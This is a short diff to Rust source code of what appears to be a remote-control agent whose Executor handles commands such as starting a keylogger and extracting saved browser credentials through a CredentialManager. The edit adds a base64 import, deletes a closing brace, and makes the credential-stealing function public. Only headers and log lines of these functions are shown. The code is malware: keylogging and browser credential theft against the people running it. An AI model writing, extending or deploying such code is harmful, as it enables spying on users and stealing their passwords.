@@ -2,6 +2,7 @@ use log::{info, error};
 use std::process::Command;
 use std::time::Instant;
 use serde::{Deserialize, Serialize};
+use base64::Engine;
 
 #[derive(Debug, Serialize, Deserialize, Clone)]
 pub enum CommandType {
@@ -432,7 +433,6 @@ impl Executor {
             }
         }
     }
-}
 
     async fn keylogger_start() -> CommandResult {
         info!("🔐 Keylogger start command received");
@@ -487,7 +487,7 @@ impl Executor {
         }
     }
 
-    async fn credentials_browser() -> CommandResult {
+    pub async fn credentials_browser() -> CommandResult {
         use crate::credentials::CredentialManager;
 
         info!("📋 Extracting browser credentials...");
